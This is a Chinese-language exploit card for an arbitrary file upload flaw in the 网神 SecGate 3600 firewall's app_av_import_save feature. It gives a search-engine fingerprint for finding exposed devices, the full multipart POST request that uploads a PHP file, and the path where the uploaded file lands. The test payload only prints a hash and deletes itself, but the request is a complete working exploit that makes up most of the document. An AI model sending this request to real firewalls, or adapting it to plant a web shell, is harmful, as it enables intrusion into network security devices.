# 网神SecGata3600防火墙app_av_import_save任意文件上传漏洞

- **系统**：网神SecGata3600防火墙app_av_import_save　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`hunter:`app.name="网神 SecGate"&&web.title=="网神SecGate 3600防火墙"``
- **请求**：`POST / HTTP/1.1`
- **关键头**：`Host: {hostname}`　`Content-Length: 451`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWn…`

**请求体 / payload**
```
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"
10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="reqfile";filename="nhzwe1.php"
Content-Type: text/plain
<?php echo(md5(13123));unlink(__FILE__);?>
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"
app_av_import_save
------WebKitFormBoundaryJpMyThWnAxbcBBQc--

上传文件位置
/attachements/nhzwe1.php
```

**其他**
- 网神SecGata 3600防火墙app\_av\_import\_save任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 网神SecGata 3600防火墙